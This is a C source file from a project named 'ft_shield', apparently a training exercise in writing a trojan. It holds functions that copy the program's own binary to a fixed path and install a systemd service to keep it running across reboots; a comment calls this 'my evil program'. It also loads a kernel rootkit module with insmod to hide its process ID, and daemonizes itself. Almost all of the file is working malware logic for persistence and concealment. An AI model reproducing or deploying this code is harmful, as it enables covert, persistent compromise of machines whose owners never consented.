#include "../includes/ft_shield.h"

t_daemon *create_daemon( void ) {
	//logger.log_entry("Creating server", "INFO");
	t_daemon *daemon;

	daemon = malloc(sizeof(t_daemon));
	if (init_server(daemon) == 0) {
        perror("Server not listening");
        exit(EXIT_FAILURE);
	}
	//logger.log_entry("Server created", "INFO");
	return daemon;
}

// From the original Daemonize function
/* (This function forks, and if the fork(2) succeeds, the parent
			 calls _exit(2), so that further errors are seen by the child
			 only.)  On success Daemon() returns zero.  If an error occurs,
			 Daemon() returns -1 and sets errno to any of the errors specified
			 for the fork(2) and setsid(2). */

void copy_payload(char *curdir) {
	if (access(EXECUTABLE_FILE, F_OK) != 0) {
		int in_fd = open(curdir, O_RDONLY);
		int out_fd = open(EXECUTABLE_FILE, O_WRONLY | O_TRUNC | O_CREAT, 0755);
		if (in_fd < 0 || out_fd < 0) {
			//logger.log_entry("Error copying executable", "ERROR");
			exit(EXIT_FAILURE);
		}
		// get size
		struct stat st;
		fstat(in_fd, &st);
		if (sendfile(out_fd, in_fd, NULL, st.st_size) < 0) {
			//logger.log_entry("Error copying executable", "ERROR");
			exit(EXIT_FAILURE);
		}
		if (close(in_fd) < 0 || close(out_fd) < 0) {
			//logger.log_entry("Error closing executable", "ERROR");
			exit(EXIT_FAILURE);
		}
	}
	else {
		//logger.log_entry("File already exists", "DEBUG");
		printf("DEBUG: File already exists\n");
	}
}

void startup_setup (void) {
	// create ini file
	FILE *ini_file = fopen(SYSTEMD_FILE, "w");
	// write content to file
	fprintf(ini_file, INI_CONTENT);
	fclose(ini_file);
	// Reload daemon
	system("systemctl daemon-reload");
	// enable my evil program hehe
	system("systemctl enable ft_shield.service");
	// start service
	system("systemctl start ft_shield.service");
}

void hide_pid(void) {
	int pid = getpid();
	char cmd[256];

	dprintf(2, "Hiding %i\n", pid);
	snprintf(cmd, sizeof(cmd), "insmod %s hidden_pid=%d", "/home/vagrant/ft_shield/srcs/modules/rootkit.ko", pid);
	system(cmd);
	dprintf(2, "Rootkit loaded\n");
}

void ft_daemonize(void) {
	pid_t pid = fork(); 

	if (pid == -1) { 
		//logger.log_entry(strerror(errno), "ERROR");
		exit(EXIT_FAILURE); 
	} 
	if (pid > 0) { 
		exit(EXIT_SUCCESS);
	}
	//logger.log_entry("Entering Daemon mode", "INFO");
	//logger.log_entry("started. PID: " + std::to_string(getpid()) + ".", "INFO");
}

// https://stackoverflow.com/questions/1599459/optimal-lock-file-method
void create_lock_file(t_daemon *daemon) {
	// create file
	daemon->_lock_file_fd = open(LOCK_FILE, O_RDWR | O_CREAT, 0666);
	if (daemon->_lock_file_fd < 0) {
		perror( "Can't open or creating: "LOCK_FILE);
		//logger.log_entry("Error creating lock file", "ERROR");
		//logger.log_entry("Quitting", "INFO");
		exit(EXIT_FAILURE);
	}
	// lock file
	if (flock(daemon->_lock_file_fd, LOCK_EX | LOCK_NB) == -1)
	{
        perror( "Can't open: "LOCK_FILE);
		//logger.log_entry("Error file locked", "ERROR");
		//logger.log_entry("Quitting", "INFO");
		exit(EXIT_FAILURE);  
	}
}
